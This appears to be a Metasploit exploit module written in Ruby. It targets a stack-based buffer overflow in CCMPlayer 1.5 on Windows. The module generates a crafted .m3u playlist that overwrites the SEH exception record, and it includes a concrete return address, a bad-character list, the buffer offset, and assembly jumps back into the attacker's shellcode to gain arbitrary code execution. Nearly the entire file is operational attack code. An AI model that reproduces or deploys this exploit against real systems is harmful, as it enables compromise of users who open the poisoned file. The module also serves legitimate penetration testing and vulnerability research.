##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CCMPlayer 1.5 Stack based Buffer Overflow (.m3u)',
			'Description'    => %q{
					This module exploits a stack based buffer overflow in CCMPlayer 1.5. Opening
				a m3u playlist with a long track name, a SEH exception record can be overwritten
				with parts of the controllable buffer. SEH execution is triggered after an
				invalid read of an injectible address, thus allowing arbitrary code execution.
				This module works on multiple Windows platforms including: Windows XP SP3,
				Windows Vista, and Windows 7.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Rh0'],	# discovery and metasploit module
			'References'     => 
				[
					['URL', 'http://www.exploit-db.com/exploits/18178/']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space' => 0x1000,
					'BadChars' => "\x00\x0d\x0a\x1a\x2c\x2e\x3a\x5c", # \x00\r\n\x1a,.:\\
					'DisableNops' => 'True',
					'StackAdjustment' => -3500,
				},
			'Platform'		=> 'win',
			'Targets'		=>
				[
					[
						'CCMPlayer 1.5',
						{
							# pop esi / pop ebx / ret (in ccmplay.exe)
							# tweak it if necessary
							'Ret' => 0x00403ca7,	# last NULL in buffer is accepted
							'Offset' => 0x1000
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => '30 Nov 2011', # to my knowledge
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msf.m3u']),
				], self.class)
	end

	def exploit

		m3u = "C:\\"
		# shellcode
		m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "nop").encode_string * 25
		m3u << payload.encoded
		# junk
		m3u << rand_text_alpha_upper(target['Offset'] - (25 + payload.encoded.length))
		# need an access violation when reading next 4 bytes as address (0xFFFFFFFF)
		# to trigger SEH
		m3u << [0xffffffff].pack("V")
		# pad
		m3u << rand_text_alpha_upper(3)
		# long jmp: jmp far back to shellcode
		m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-4103").encode_string
		# NSEH: jmp short back to long jmp instruction
		m3u << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5").encode_string
		# pad (need more 2 bytes to fill up to 4, as jmp $-5 are only 2 bytes)
		m3u << rand_text_alpha_upper(2)
		# SEH Exception Handler Address -> p/p/r
		m3u << [target.ret].pack("V")
		m3u << ".mp3\r\n"	# no crash without it

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		# Open CCMPlayer -> Songs -> Add -> Files of type: m3u -> msf.m3u => exploit
		file_create(m3u)

	end

end
